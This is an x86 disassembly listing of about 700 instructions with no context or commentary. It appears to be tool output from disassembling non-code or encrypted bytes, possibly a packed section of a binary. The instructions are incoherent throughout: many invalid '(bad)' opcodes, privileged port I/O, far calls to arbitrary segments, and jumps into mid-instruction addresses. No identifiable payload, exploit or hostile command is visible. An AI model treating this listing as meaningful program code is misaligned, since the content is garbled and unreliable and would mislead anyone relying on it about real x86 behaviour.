  403222:	sbb    DWORD PTR [ebp-0x3],eax
  403225:	jl     0x403254
  403227:	fld    QWORD PTR [esi+edi*4+0x58a04cad]
  40322e:	mov    ds:0x4e17cc52,al
  403233:	cmp    eax,0x2b67f41e
  403238:	sub    eax,0x6c2064f5
  40323d:	nop
  40323e:	mov    DWORD PTR [ecx+ebx*4],esp
  403241:	or     eax,0xdf848dba
  403246:	add    BYTE PTR [edi+eax*2],0xd4
  40324a:	xchg   BYTE PTR [ebx-0x55836fb],al
  403250:	push   edx
  403251:	jl     0x40327c
  403253:	(bad)  
  403254:	ins    DWORD PTR es:[edi],dx
  403255:	retf   0xbfc
  403258:	sar    BYTE PTR [edi],cl
  40325a:	dec    ecx
  40325b:	mov    cl,ch
  40325d:	push   esi
  40325e:	pop    ds
  40325f:	push   es
  403260:	mov    al,0x3d
  403262:	jl     0x4031ed
  403264:	add    dh,BYTE PTR [ebp-0x65]
  403267:	lfs    edi,FWORD PTR [eax]
  40326a:	cmc    
  40326b:	pop    ds
  40326c:	test   eax,0x7bc9ca31
  403271:	outs   dx,BYTE PTR ds:[esi]
  403272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403273:	fwait
  403274:	aaa    
  403275:	aas    
  403276:	or     eax,0xcc83b4af
  40327b:	dec    esp
  40327c:	rcr    esp,cl
  40327e:	and    ecx,esp
  403280:	adc    al,0xc7
  403282:	push   0xffffffb0
  403284:	pop    es
  403285:	push   ecx
  403286:	jecxz  0x4032a3
  403288:	sbb    BYTE PTR [ebx],0x52
  40328b:	cdq    
  40328c:	sbb    ch,BYTE PTR [edi+0xc]
  40328f:	in     eax,dx
  403290:	mov    ah,0x9c
  403292:	retf   
  403293:	addr16 pop es
  403295:	pop    edi
  403296:	mov    cl,0x8e
  403298:	mov    ch,BYTE PTR [ebx+0x3c36d300]
  40329e:	repz jno 0x4032fc
  4032a1:	and    DWORD PTR [eax],eax
  4032a3:	pop    edx
  4032a4:	push   eax
  4032a5:	fs scas eax,DWORD PTR es:[edi]
  4032a7:	(bad)  
  4032a8:	out    dx,eax
  4032a9:	in     eax,dx
  4032aa:	jb     0x40326c
  4032ac:	sub    DWORD PTR [edx-0x6d36a08c],ebx
  4032b2:	pop    ss
  4032b3:	aad    0x7b
  4032b5:	inc    edi
  4032b6:	cmp    edx,edi
  4032b8:	(bad)  
  4032b9:	sub    DWORD PTR [edi+0x6bfd99b4],ebp
  4032bf:	inc    eax
  4032c0:	mov    dl,al
  4032c2:	stc    
  4032c3:	lods   eax,DWORD PTR ds:[esi]
  4032c4:	outs   dx,DWORD PTR ds:[esi]
  4032c5:	nop
  4032c6:	mov    cl,0x2d
  4032c8:	add    al,0x0
  4032ca:	cmp    eax,0xa94a793d
  4032cf:	dec    dh
  4032d1:	cmp    ah,cl
  4032d3:	inc    eax
  4032d4:	inc    ebp
  4032d5:	outs   dx,DWORD PTR ds:[esi]
  4032d6:	pop    ebx
  4032d7:	fldenv [edi]
  4032d9:	cmc    
  4032da:	xchg   esp,eax
  4032db:	mov    ah,bh
  4032dd:	sbb    DWORD PTR [edx],edi
  4032df:	pop    esi
  4032e0:	inc    edx
  4032e1:	mov    eax,ds:0x303550fb
  4032e6:	test   al,0x59
  4032e8:	lds    ecx,FWORD PTR [ebp+0x4]
  4032eb:	fisubr DWORD PTR [ebp+edx*4-0x798c72fe]
  4032f2:	shl    BYTE PTR [edi],1
  4032f4:	lock mov BYTE PTR [ebp+edx*8-0x4b581e7f],ah
  4032fc:	in     al,dx
  4032fd:	xchg   DWORD PTR [edx-0x2122386b],esi
  403303:	push   edx
  403304:	out    dx,eax
  403305:	xor    al,0x21
  403307:	xchg   DWORD PTR [edx],edx
  403309:	imul   edi,ebx,0xfffffff0
  40330c:	out    dx,eax
  40330d:	aam    0xb7
  40330f:	cmp    ah,ch
  403311:	push   ebp
  403312:	or     ch,BYTE PTR [ebp-0x2b2cae1b]
  403318:	lea    esp,[ecx+0x7831d491]
  40331e:	popf   
  40331f:	sub    ecx,DWORD PTR ds:[eax]
  403322:	mov    ebp,DWORD PTR [eax]
  403324:	mov    ds:0x323fc43c,eax
  403329:	cld    
  40332a:	clc    
  40332b:	aas    
  40332c:	fldcw  WORD PTR [ebp-0x240906f1]
  403332:	ret    0xb4c
  403335:	lahf   
  403336:	xchg   DWORD PTR [edi+edi*1-0x6e1dfc39],esi
  40333d:	or     cl,ah
  40333f:	loopne 0x4033a1
  403341:	idiv   BYTE PTR [esi-0x3]
  403344:	mov    eax,0x436a9f4
  403349:	cli    
  40334a:	mov    bh,0xcc
  40334c:	pop    esp
  40334d:	sbb    DWORD PTR [ecx-0x36],0x4
  403351:	clc    
  403352:	popa   
  403353:	(bad)  
  403354:	push   0x2d
  403356:	fistp  DWORD PTR [edx]
  403358:	repz jp 0x403334
  40335b:	xchg   edi,eax
  40335c:	fisub  DWORD PTR [esp+eiz*8-0x29891794]
  403363:	push   ebx
  403364:	inc    edi
  403365:	push   ecx
  403366:	loopne 0x403305
  403368:	les    ebx,FWORD PTR [esi-0x55a99895]
  40336e:	lds    eax,FWORD PTR [edx-0xa33dacf]
  403374:	xchg   BYTE PTR [esi-0x786c04ba],ah
  40337a:	daa    
  40337b:	mov    edx,DWORD PTR [ecx-0x1bdc6b69]
  403381:	inc    ebp
  403382:	jae    0x403366
  403384:	jb     0x40335d
  403386:	mov    ch,0x85
  403388:	push   ecx
  403389:	jbe    0x403334
  40338b:	pop    esp
  40338c:	sub    al,0x33
  40338e:	jmp    0x403323
  403390:	test   BYTE PTR [edi],cl
  403392:	inc    ebp
  403393:	jb     0x4033af
  403395:	mov    al,0xa2
  403397:	jb     0x4033de
  403399:	dec    eax
  40339a:	mov    bh,BYTE PTR [ebp+eiz*8-0x34dd32b8]
  4033a1:	or     DWORD PTR [ebx],0x5e765a8d
  4033a7:	stos   BYTE PTR es:[edi],al
  4033a8:	inc    ecx
  4033a9:	xchg   esp,eax
  4033aa:	rcl    DWORD PTR [esi-0x63dc2186],0x65
  4033b1:	nop
  4033b2:	lods   eax,DWORD PTR ds:[esi]
  4033b3:	jne    0x403425
  4033b5:	fdiv   DWORD PTR [edi]
  4033b7:	lods   eax,DWORD PTR ds:[esi]
  4033b8:	test   eax,0x7925c267
  4033bd:	add    eax,0xbae7c0d1
  4033c2:	ret    0x3713
  4033c5:	xchg   ebp,eax
  4033c6:	sub    esp,DWORD PTR [ebx]
  4033c8:	sbb    eax,0xda4f180c
  4033cd:	out    dx,eax
  4033ce:	mov    bl,0xf
  4033d0:	and    al,0xab
  4033d2:	pop    ebx
  4033d3:	mov    edx,0xccc66dba
  4033d8:	cmp    ebx,edx
  4033da:	sub    eax,0x7fab626f
  4033df:	aad    0x6c
  4033e1:	out    0x4,eax
  4033e3:	sbb    DWORD PTR ds:0x46c4a758,0x85d63420
  4033ed:	push   esi
  4033ee:	xchg   BYTE PTR [edx-0x2ea0ff9f],cl
  4033f4:	xchg   ecx,eax
  4033f5:	pushf  
  4033f6:	in     al,dx
  4033f7:	imul   edx,DWORD PTR [esp+ebx*1+0x7a],0xffffff8f
  4033fc:	je     0x40342d
  4033fe:	and    BYTE PTR [ebx-0x1d134a66],dh
  403404:	push   es
  403405:	call   0xed98:0x80ac9e21
  40340c:	(bad)  
  40340d:	mov    edx,0x68f6d57c
  403412:	sbb    edx,ebp
  403414:	das    
  403415:	imul   eax,DWORD PTR ss:[esi+0x32],0x68
  40341a:	lahf   
  40341b:	cmp    eax,esp
  40341d:	test   al,0x1b
  40341f:	xchg   esp,eax
  403420:	into   
  403421:	nop
  403422:	cmc    
  403423:	fsub   QWORD PTR [eax+0x1a82dbfd]
  403429:	cmp    dh,BYTE PTR [ebx]
  40342b:	pop    esi
  40342c:	push   eax
  40342d:	sub    al,ch
  40342f:	test   eax,0x523db75
  403434:	cmp    ch,BYTE PTR [eax]
  403436:	jbe    0x403499
  403438:	out    dx,eax
  403439:	sub    al,0x49
  40343b:	scas   al,BYTE PTR es:[edi]
  40343c:	(bad)  
  40343d:	cwde   
  40343e:	ja     0x403420
  403440:	sbb    eax,DWORD PTR [ebx]
  403442:	outs   dx,DWORD PTR ds:[esi]
  403443:	(bad)  
  403445:	xor    al,0x17
  403447:	mov    esi,0xc47ed2f1
  40344c:	and    ecx,DWORD PTR [edi+0x319e8dd1]
  403452:	cmp    al,0xfe
  403454:	fwait
  403455:	mov    ds:0x7dd03270,al
  40345a:	loop   0x403422
  40345c:	aam    0x21
  40345e:	push   eax
  40345f:	stos   DWORD PTR es:[edi],eax
  403460:	daa    
  403461:	rcr    BYTE PTR [edx*4+0x179be7d1],1
  403468:	push   esp
  403469:	and    al,0xc9
  40346b:	mov    dl,0x17
  40346d:	dec    edx
  40346f:	into   
  403470:	lods   al,BYTE PTR ds:[esi]
  403471:	dec    ebp
  403472:	mov    ebx,0xa354ff4b
  403477:	mov    ch,0xa8
  403479:	mov    ah,BYTE PTR [ebx]
  40347b:	and    DWORD PTR [eax],eax
  40347d:	aas    
  40347e:	or     DWORD PTR [ebp+0x1b],0x584665f6
  403485:	popa   
  403486:	xchg   esi,eax
  403487:	xchg   edx,eax
  403488:	mov    al,0xd4
  40348a:	and    al,0x9a
  40348c:	popf   
  40348d:	pop    ecx
  40348e:	xchg   ecx,eax
  40348f:	into   
  403490:	pop    esi
  403491:	or     DWORD PTR [bx+si],0x65711a4c
  403498:	xchg   DWORD PTR [ebp+0x4e],esi
  40349b:	cmp    edx,DWORD PTR [ebx]
  40349d:	ds jl  0x403462
  4034a0:	popa   
  4034a1:	mov    esp,0x174a7058
  4034a6:	mov    ebx,0x3b71c601
  4034ab:	(bad)  
  4034ac:	push   ss
  4034ad:	ins    DWORD PTR es:[edi],dx
  4034ae:	data16 shr al,1
  4034b1:	xchg   ecx,eax
  4034b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034b3:	mov    esp,0x94cde28d
  4034b8:	jmp    0x4034d4
  4034ba:	inc    ecx
  4034bb:	push   edi
  4034bc:	mov    dl,BYTE PTR [ebp-0x397ba58e]
  4034c2:	inc    ecx
  4034c3:	dec    esp
  4034c4:	push   0x280cb4c1
  4034c9:	gs jg  0x403539
  4034cc:	sbb    BYTE PTR [eax+0x3e7838b0],al
  4034d2:	fmul   DWORD PTR [ecx+esi*1+0x14379e94]
  4034d9:	or     BYTE PTR [eax],bh
  4034db:	and    al,0xfa
  4034dd:	retf   0x963d
  4034e0:	out    dx,al
  4034e1:	stos   DWORD PTR es:[edi],eax
  4034e2:	loope  0x403510
  4034e4:	push   ebx
  4034e5:	mov    cl,0x54
  4034e7:	jbe    0x4034ae
  4034e9:	and    al,0xf8
  4034eb:	or     dh,BYTE PTR [edi]
  4034ed:	mov    cl,ch
  4034ef:	adc    al,0x9
  4034f1:	adc    cl,BYTE PTR [ecx-0x24]
  4034f4:	pop    ss
  4034f5:	sbb    eax,esp
  4034f7:	sub    eax,0xa82f65f0
  4034fc:	xor    bh,BYTE PTR [edx]
  4034fe:	out    dx,eax
  4034ff:	inc    eax
  403500:	push   ecx
  403501:	cmp    cl,bl
  403503:	xor    dl,BYTE PTR ds:0xd5af0b97
  403509:	dec    eax
  40350a:	in     eax,0x41
  40350c:	inc    ecx
  40350d:	imul   BYTE PTR [edx]
  40350f:	push   esi
  403510:	retf   
  403511:	je     0x403583
  403513:	or     ch,BYTE PTR [ebx]
  403515:	and    ah,BYTE PTR [ecx-0x31644d9f]
  40351b:	call   0x178e:0x9d10845e
  403522:	out    dx,al
  403523:	lods   al,BYTE PTR ds:[esi]
  403524:	rcl    DWORD PTR [edi-0x6f],0x40
  403528:	stos   BYTE PTR es:[edi],al
  403529:	or     eax,0xb6941796
  40352e:	(bad)  
  403530:	rcr    DWORD PTR [edi],1
  403532:	int    0xec
  403534:	(bad)  
  403535:	int3   
  403536:	test   eax,0xaf05515b
  40353b:	sbb    bl,dh
  40353d:	xchg   esi,eax
  40353e:	or     DWORD PTR [eax],ebx
  403540:	fwait
  403541:	std    
  403542:	(bad)  
  403544:	push   0xffffffbf
  403546:	dec    eax
  403547:	cdq    
  403548:	mov    edx,0x4af9eac1
  40354d:	jo     0x4035ba
  40354f:	pop    ebx
  403550:	in     eax,0x78
  403552:	rcr    BYTE PTR [edi],0x16
  403555:	stos   DWORD PTR es:[edi],eax
  403556:	push   edi
  403557:	push   eax
  403558:	pop    ebx
  403559:	pushf  
  40355a:	sbb    DWORD PTR [edx+esi*1+0x48],ebp
  40355e:	in     al,dx
  40355f:	cmp    eax,DWORD PTR [ebx]
  403561:	adc    dh,BYTE PTR [ecx]
  403563:	lods   eax,DWORD PTR ds:[esi]
  403564:	adc    eax,0x52ac8c92
  403569:	mov    eax,ds:0x51e0c7c0
  40356e:	mov    ebx,ebp
  403570:	xchg   esp,eax
  403571:	cmp    DWORD PTR [esi-0x3dcc4a6a],ebx
  403577:	fcmovne st,st(1)
  403579:	push   ss
  40357a:	dec    ecx
  40357b:	rcr    bl,1
  40357d:	mov    ah,0xcd
  40357f:	rcr    ch,cl
  403581:	xor    al,0xa4
  403583:	call   0xc8d:0xf514843c
  40358a:	sbb    ebp,DWORD PTR [eax]
  40358c:	out    dx,al
  40358d:	(bad)  
  40358e:	ins    DWORD PTR es:[edi],dx
  40358f:	add    esp,edx
  403591:	adc    ebx,0xffffffde
  403594:	xor    eax,0x9d34eea
  403599:	in     al,dx
  40359a:	ds push ds
  40359c:	stos   DWORD PTR es:[edi],eax
  40359d:	xor    eax,0x55e134be
  4035a2:	cmc    
  4035a3:	inc    BYTE PTR [ecx]
  4035a5:	dec    esi
  4035a6:	sub    BYTE PTR [eax],ch
  4035a8:	je     0x403624
  4035aa:	mov    eax,ecx
  4035ac:	ja     0x403610
  4035ae:	cmp    bl,BYTE PTR [esi]
  4035b0:	rcl    esi,cl
  4035b2:	lock popf 
  4035b4:	jno    0x4035c9
  4035b6:	pusha  
  4035b7:	je     0x40354b
  4035b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035ba:	sub    al,0xc3
  4035bc:	mov    dl,0xb2
  4035be:	mov    eax,ds:0xbf552955
  4035c3:	jmp    0x4096:0x8fa66c93
  4035ca:	fwait
  4035cb:	or     al,0x24
  4035ce:	dec    ebp
  4035cf:	mov    esi,0xec0e149e
  4035d4:	adc    al,0x9
  4035d6:	or     ecx,DWORD PTR [ebp-0x7e]
  4035d9:	cmp    eax,0xf3024d52
  4035de:	push   esi
  4035df:	pop    ecx
  4035e0:	dec    esp
  4035e1:	add    cl,al
  4035e3:	push   0xffffff9c
  4035e5:	add    ecx,DWORD PTR [edi+esi*2-0x4af52659]
  4035ec:	sbb    dh,bh
  4035ee:	push   ds
  4035ef:	sbb    DWORD PTR [edx+edi*2-0x100e5dad],esi
  4035f6:	push   es
  4035f7:	lahf   
  4035f8:	enter  0xbf04,0x11
  4035fc:	dec    ecx
  4035fd:	imul   eax,DWORD PTR gs:[edi+0x27ca8da8],0xffffffe0
  403605:	ds add dh,bh
  403608:	imul   al
  40360a:	mov    ebp,ebx
  40360c:	mov    DWORD PTR ds:0x30d6ab81,eax
  403612:	mov    ebp,0xc6f33e74
  403617:	cwde   
  403618:	jae    0x4035fe
  40361a:	lea    ebx,[esi-0x6a]
  40361d:	loope  0x403661
  40361f:	cmp    eax,0x5e0612b1
  403624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403625:	cdq    
  403626:	test   eax,0xefa1f563
  40362b:	fisubr WORD PTR [ecx-0x23]
  40362e:	call   FWORD PTR [esi+0x67]
  403631:	stos   DWORD PTR es:[edi],eax
  403632:	adc    eax,0x7c84a325
  403637:	pop    esi
  403638:	jg     0x403644
  40363a:	push   edx
  40363b:	and    DWORD PTR [esi+0x4e740635],ecx
  403641:	shl    BYTE PTR [ebx+0x54e3dbc7],cl
  403647:	cmp    eax,edi
  403649:	ins    BYTE PTR es:[edi],dx
  40364a:	pop    eax
  40364b:	mov    esp,0x16be546e
  403650:	mov    dh,0x10
  403652:	call   FWORD PTR [eax]
  403654:	ror    BYTE PTR [edi+0x3fa8adf3],1
  40365a:	pushf  
  40365b:	(bad)  
  40365c:	dec    DWORD PTR [ecx-0x44]
  40365f:	xor    DWORD PTR [edx],ebp
  403661:	sub    DWORD PTR [edi+0x40],0x1082a009
  403668:	adc    ecx,DWORD PTR [ebp-0x43]
  40366b:	arpl   WORD PTR [edi],bp
  40366d:	add    eax,0x7cff6b0d
  403672:	nop
  403673:	mov    al,0xa9
  403675:	es ins BYTE PTR es:[edi],dx
  403677:	dec    esi
  403678:	dec    ebp
  403679:	sub    al,0xc8
  40367b:	std    
  40367c:	push   ds
  40367d:	enter  0xb0d5,0x88
  403681:	scas   al,BYTE PTR es:[edi]
  403682:	outs   dx,DWORD PTR ds:[esi]
  403683:	and    eax,0x4ea8c6b9
  403688:	std    
  403689:	fimul  WORD PTR [edx+0x1935a39d]
  40368f:	daa    
  403690:	div    ebx
  403692:	(bad)  
  403693:	leave  
  403694:	shld   DWORD PTR [eax-0x4eaf57c],ebp,0xd0
  40369c:	or     BYTE PTR [ebx],0xc3
  40369f:	pop    esi
  4036a0:	adc    BYTE PTR [ebx+0x6e],dh
  4036a3:	cmp    ah,dh
  4036a5:	inc    esi
  4036a6:	fmul   QWORD PTR [ebx]
  4036a8:	adc    al,BYTE PTR [edx+0xb07da4d]
  4036ae:	repz mov esi,0x34cb23f0
  4036b4:	push   edx
  4036b5:	mov    bl,0xde
  4036b7:	mov    DWORD PTR [ecx],edi
  4036b9:	jmp    0xd961:0x9e13a7cb
  4036c0:	lods   eax,DWORD PTR ds:[esi]
  4036c1:	xlat   BYTE PTR ds:[ebx]
  4036c2:	pushf  
  4036c3:	add    DWORD PTR [esi],esp
  4036c5:	hlt    
  4036c6:	cwde   
  4036c7:	loop   0x4036a3
  4036c9:	ret    
  4036ca:	xchg   ecx,eax
  4036cb:	push   0xb8cb6586
  4036d0:	dec    ebp
  4036d1:	mov    al,ds:0x213b2b25
  4036d6:	or     bl,BYTE PTR [edx]
  4036d8:	jno    0x403733
  4036da:	and    eax,0xd3335ef
  4036df:	xchg   ebx,eax
  4036e0:	gs call 0xc96802fc
  4036e6:	pushf  
  4036e7:	pop    ebp
  4036e8:	scas   eax,DWORD PTR es:[edi]
  4036e9:	stc    
  4036ea:	cmp    esp,DWORD PTR [edx*8+0x5286931e]
  4036f1:	pop    ebx
  4036f2:	mov    edx,0x6701ca9b
  4036f7:	lahf   
  4036f8:	call   0xa450f8b9
  4036fd:	mov    bh,0x67
  4036ff:	mov    bh,0xce
  403701:	sub    al,0xf4
  403703:	push   edi
  403704:	jne    0x4036a7
  403706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403707:	xchg   edx,eax
  403708:	rcr    BYTE PTR [ecx],1
  40370a:	adc    DWORD PTR [esi-0x5b],edx
  40370d:	mov    ds:0x2780c69e,eax
  403712:	and    dl,al
  403714:	mov    ah,0xfd
  403716:	adc    al,0x75
  403718:	out    dx,eax
  403719:	fisttp QWORD PTR [edi-0x7e94b549]
  40371f:	test   esp,0x2fe64139
  403725:	xlat   BYTE PTR ds:[ebx]
  403726:	fidivr DWORD PTR [edx]
  403728:	sti    
  403729:	call   FWORD PTR [esi+edi*2-0x468ae1b3]
  403730:	rcr    esp,1
  403732:	icebp  
  403733:	and    al,0x7f
  403735:	add    bl,BYTE PTR [ebx]
  403737:	dec    ebx
  403738:	in     al,0xed
  40373a:	das    
  40373b:	setae  ch
  40373e:	xor    eax,0xfdcd184a
  403743:	jb     0x4037c0
  403745:	scas   eax,DWORD PTR es:[edi]
  403746:	cwde   
  403747:	dec    ebp
  403748:	xchg   edx,eax
  403749:	and    al,BYTE PTR [edi-0x80]
  40374c:	push   ds
  40374d:	inc    esp
  40374e:	inc    ecx
  40374f:	adc    eax,0x92801a6f
  403754:	push   es
  403755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403756:	gs in  eax,dx
  403758:	mov    edx,0xb7833440
  40375d:	ins    DWORD PTR es:[edi],dx
  40375e:	pop    ds
  40375f:	jne    0x40374a
  403761:	es (bad) 
  403764:	hlt    
  403765:	xor    ecx,ecx
  403767:	xchg   esp,eax
  403768:	in     eax,0xfb
  40376a:	sbb    al,0xf2
  40376c:	mov    ecx,0xff3675d
  403771:	jecxz  0x4037c6
  403773:	xor    eax,0xfb633156
  403778:	cmp    cl,bl
  40377a:	sbb    al,BYTE PTR ds:0xa8b576fc
  403780:	sub    al,0x92
  403782:	ss repz jl 0x4037f5
  403786:	in     al,dx
  403787:	retf   0x56ac
  40378a:	xchg   ebx,eax
  40378b:	fadd   DWORD PTR [ebx-0x67ee44b5]
  403791:	aam    0x6a
  403793:	inc    esi
  403794:	or     DWORD PTR [edi+0x4ac0d501],ecx
  40379a:	mov    bl,0x3b
  40379c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40379d:	xchg   edi,eax
  40379e:	xor    ebp,DWORD PTR [ebx]
  4037a0:	mov    ?,WORD PTR [edx-0x12550692]
  4037a6:	sbb    bl,BYTE PTR [edx+0x6688ba12]
  4037ac:	aaa    
  4037ad:	jmp    0x6c9a0c82
  4037b2:	adc    BYTE PTR [esi],al
  4037b4:	cdq    
  4037b5:	aam    0xc0
  4037b7:	retf   0x261
  4037ba:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037bc:	inc    ebx
  4037bd:	std    
  4037be:	clc    
  4037bf:	mov    ebp,0x35f5b5f0
  4037c4:	fwait
  4037c5:	scas   eax,DWORD PTR es:[edi]
  4037c6:	mov    ebp,0x23d5b2ca
  4037cb:	jb     0x403843
  4037cd:	imul   ecx,DWORD PTR [eax-0x11a82d06],0x39
  4037d4:	ins    BYTE PTR es:[edi],dx
  4037d5:	pop    ss
  4037d6:	add    dl,BYTE PTR [esi-0x2d]
  4037d9:	dec    eax
  4037da:	push   ebx
  4037db:	xor    BYTE PTR [ecx],ah
  4037dd:	shl    BYTE PTR [ebp-0x7a],0x46
  4037e1:	mov    ch,0x60
  4037e3:	nop
  4037e4:	lea    ebx,[eax-0x4e18e26b]
  4037ea:	int    0xc4
  4037ec:	enter  0x6bc1,0x83
  4037f0:	or     DWORD PTR [eax],ebx
  4037f2:	inc    ebp
  4037f3:	sbb    ah,BYTE PTR [edi]
  4037f5:	or     ah,0xb8
  4037f8:	add    eax,DWORD PTR ds:0x70a9f4bd
  4037fe:	cld    
  4037ff:	lods   al,BYTE PTR ds:[esi]
  403800:	rcr    DWORD PTR ds:[edi+ebp*4],cl
  403804:	adc    eax,0x8cf0977
  403809:	mov    al,ds:0xe34fdd41
  40380e:	adc    al,0x69
  403810:	es mov ebp,ebx
  403813:	hlt    
  403814:	jnp    0x4037a7
  403816:	pop    edi
  403817:	inc    edx
  403818:	rol    DWORD PTR [edi+0x50d140d4],cl
  40381e:	lods   eax,DWORD PTR ds:[esi]
  40381f:	not    BYTE PTR [eax+0x5c]
  403822:	rcr    DWORD PTR [esi],cl
  403824:	maskmovq mm5,(bad)
  403825:	imul   DWORD PTR [edx]
  403827:	mov    edi,DWORD PTR [edx-0x7f]
  40382a:	mov    ebx,0x3d1432df
  40382f:	(bad)  
  403830:	in     eax,0xd8
  403832:	outs   dx,BYTE PTR ds:[esi]
  403833:	call   0x3e6c:0x33af256e
  40383a:	xchg   ecx,eax
  40383b:	(bad)  
  40383c:	imul   edi,DWORD PTR ds:0xcd237894,0xa95d4fbc
  403846:	shl    DWORD PTR [ecx+0x48],cl
  403849:	leave  
  40384a:	or     DWORD PTR [ebx+0x7c],0x33
  40384e:	dec    ebx
  40384f:	(bad)  
  403850:	push   edx
  403851:	jp     0x4037de
  403853:	jns    0x4038bd
  403855:	pop    ecx
  403856:	xor    eax,0xaba371aa
  40385b:	call   0x6ddeb253
  403860:	jmp    0x4038aa
  403862:	add    eax,0x7d341475
  403867:	dec    eax
  403868:	add    esp,DWORD PTR [eax]
  40386a:	dec    edi
  40386b:	pop    ecx
  40386c:	std    
  40386d:	es sahf 
  40386f:	(bad)  
  403870:	cmp    BYTE PTR [ebx+0x26],ch
  403873:	add    DWORD PTR [ecx-0x76],0xffffff91
  403877:	or     ah,BYTE PTR ds:0x2f4c94a9
  40387d:	fld    QWORD PTR ds:0xe2986d10
  403883:	mov    esp,0xd6dbb6a6
  403888:	test   al,0xe4
  40388a:	jmp    0x403853
  40388c:	fwait
  40388d:	ja     0x403890
  40388f:	outs   dx,DWORD PTR ds:[esi]
  403890:	stos   DWORD PTR es:[edi],eax
  403891:	cld    
  403892:	ja     0x4038d5
  403894:	jmp    0x394dc7a5
  403899:	in     eax,dx
  40389a:	ror    BYTE PTR [ebx],1
  40389c:	jmp    0x40390d
  40389e:	jl     0x403914
  4038a0:	js     0x4038cf
  4038a2:	rcl    BYTE PTR [ecx],0x80
  4038a5:	retf   0xafb3
  4038a8:	mov    bl,0x9
  4038aa:	(bad)
  4038af:	fistp  QWORD PTR [esi+0x76]
  4038b2:	sar    edx,cl
  4038b4:	dec    esp
  4038b5:	and    eax,0xbcb6ee6e
  4038ba:	outs   dx,BYTE PTR ds:[esi]
  4038bb:	jb     0x4038bc
  4038bd:	cmp    eax,0xae484324
  4038c2:	aam    0x13
  4038c4:	jecxz  0x4038e1
  4038c6:	shr    DWORD PTR [esi+0x7c375d26],0xd9
  4038cd:	sbb    eax,edi
  4038cf:	adc    DWORD PTR [ecx+0x6bdcfba4],ebx
  4038d5:	ror    BYTE PTR [eax],1
  4038d7:	icebp  
  4038d8:	cmp    dh,ch
  4038da:	scas   eax,DWORD PTR es:[edi]
  4038db:	inc    ebp
  4038dc:	sub    ah,BYTE PTR [edi+0x4e]
  4038df:	push   esp
  4038e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e1:	xor    eax,0xe7a69140
  4038e6:	mov    ?,ebp
  4038e8:	mov    ecx,0xe4e1b88a
  4038ed:	rcl    DWORD PTR [esi+0x459500fd],cl
  4038f3:	push   cs
  4038f4:	fcomp  QWORD PTR [ecx+0x69b26ec]
  4038fa:	shl    ecx,0xf7
  4038fd:	ins    DWORD PTR es:[edi],dx
  4038fe:	mov    al,ds:0xe9cc17cc
  403903:	out    0x3c,al
  403905:	out    dx,eax
  403906:	icebp  
  403907:	sbb    edi,DWORD PTR ss:[ebp-0x7c]
  40390b:	pop    ds
  40390c:	nop
  40390d:	pop    ecx
  40390e:	fisttp DWORD PTR [esp+edx*1-0x66]
  403912:	mov    BYTE PTR [edi+0x53],ch
  403915:	jmp    0xdbe1:0x368e0e37
  40391c:	cmp    BYTE PTR [ecx+0x7c1198d5],bh
  403922:	fs jae 0x403922
  403925:	repnz adc bh,BYTE PTR [ecx+0x44ffa26f]
  40392c:	push   ss
  40392d:	(bad)  
  40392e:	cld    
  40392f:	lods   al,BYTE PTR ds:[esi]
  403930:	cs and al,0x11
  403933:	(bad)  [ebp-0x70]
  403936:	add    DWORD PTR [eax-0x4926f096],esi
  40393c:	in     eax,dx
  40393d:	push   0xffffffd9
  40393f:	jno    0x403920
  403941:	(bad)  
  403942:	ficomp WORD PTR [edx+0x1a]
  403945:	push   ebx
  403946:	popa   
  403947:	push   0x3c1e6bae
  40394c:	sub    ch,BYTE PTR [edx+0x12476c59]
  403952:	adc    al,0x40
  403954:	mov    eax,ds:0x15bba82f
  403959:	jo     0x4038f0
  40395b:	cmp    eax,DWORD PTR [edx+0xd762cb3]
  403961:	inc    eax
  403962:	and    al,0x8
  403964:	ja     0x403922
  403966:	mov    bh,0xba
  403968:	push   ecx
  403969:	ins    BYTE PTR es:[edi],dx
  40396a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40396b:	mov    ecx,0xdef84ea4
  403970:	ja     0x403904
  403972:	fdiv   st(6),st
  403974:	jnp    0x4039db
  403976:	hlt    
  403977:	dec    ecx
  403978:	and    eax,0xc41e9680
  40397d:	(bad)  
  40397e:	scas   eax,DWORD PTR es:[edi]
  40397f:	dec    ebp
  403980:	call   0x4355:0xbbd20bc6
  403987:	hlt    
  403988:	ins    DWORD PTR es:[edi],dx
  403989:	jnp    0x40397e
  40398b:	sbb    DWORD PTR [ebx+edi*2-0x2c],0xffffff96
  403990:	adc    dh,0xf8
  403993:	push   esp
  403994:	mov    al,ds:0x1f4ae68d
  403999:	mov    cl,0xf4
  40399b:	and    edi,DWORD PTR [eax+eiz*2+0x31]
  40399f:	xchg   ecx,eax
  4039a0:	jb     0x403947
  4039a2:	cmp    esp,DWORD PTR [eax+edx*2]
  4039a5:	test   edi,esp
  4039a7:	sub    DWORD PTR [ebx+ebp*2],0x8a30fb40
  4039ae:	aaa    
  4039af:	mov    dh,0x94
  4039b1:	add    BYTE PTR [ebx],dl
  4039b3:	mov    ebp,0xfe602ba3
  4039b8:	adc    esi,ebx
  4039ba:	in     eax,0x45
  4039bc:	fwait
  4039bd:	push   cs
  4039be:	ror    BYTE PTR [ebx+0x53],0xa0
  4039c2:	out    dx,al
  4039c3:	arpl   WORD PTR [bx],bp
  4039c6:	jo     0x4039df
  4039c8:	push   eax
  4039c9:	je     0x403a1d
  4039cb:	dec    eax
  4039cc:	add    DWORD PTR [edx-0x40],ebp
  4039cf:	add    al,0xf2
  4039d1:	xchg   BYTE PTR [eax+0x3e],ch
  4039d4:	mov    ch,0x44
  4039d6:	add    DWORD PTR [ebp-0x51],edx
  4039d9:	mov    al,0x8c
  4039db:	scas   al,BYTE PTR es:[edi]
  4039dc:	jo     0x4039cb
  4039de:	ds pop ebp
  4039e0:	sub    DWORD PTR [ebx-0x17],esi
  4039e3:	(bad)  
  4039e4:	push   edi
  4039e5:	sar    DWORD PTR [edi+0x3b],0xde
  4039e9:	ds and bl,al
